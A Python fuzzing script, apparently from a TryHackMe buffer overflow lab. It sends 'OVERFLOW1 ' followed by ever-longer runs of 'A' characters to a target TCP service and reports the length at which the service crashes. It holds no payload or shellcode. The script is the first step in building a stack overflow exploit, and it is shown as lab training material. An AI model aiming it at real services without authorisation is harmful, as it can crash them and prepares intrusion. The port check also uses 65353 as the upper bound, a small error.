"""
    Code By: RoadLuck & TryHackMe

"""
import argparse
import re

import socket
import time
import sys



def socket_connection(ip, prefix, port, string):
    timeout = 5
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip, port))
                s.recv(1024)
                print("Fuzzing con {} bytes".format(len(string) - len(prefix)))
                s.send(bytes(string, "latin-1"))
                s.recv(1024)
        except:
            print("Fuzzing crashed en {} bytes".format(len(string) - len(prefix)))
            sys.exit(0)
        string += 1000 * "A"
        time.sleep(1)

def is_valid_ip(ip):
    """
        Determina si la ip ingresada es valida.
    """
    regx = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
    validator = re.match(regx,ip)
    if not validator:
        return False
    return validator



def main():
    parser = argparse.ArgumentParser("fuzzing.py")
    parser.add_argument("-ip", help="Target IP server.", type=str)
    parser.add_argument("-p", "--port", help="Target Port", type=int, required=False, default=None)
    args = parser.parse_args()

    if args.ip is None or not is_valid_ip(args.ip):
        parser.error("-ip requiere de una ipv4 valida.")
    if args.port is None or (args.port < 0 or args.port > 65353):
        parser.error("-p, --port requiere de un puerto valido.")

    ip = args.ip
    port = args.port

    prefix = "OVERFLOW1 " #Aqui puede ir cualquier comando del programa oscp u otro programa de consola.
    string = prefix +  "A" * 1000
    
    socket_connection(ip, prefix, port, string)
    


if __name__== '__main__':
    main()

        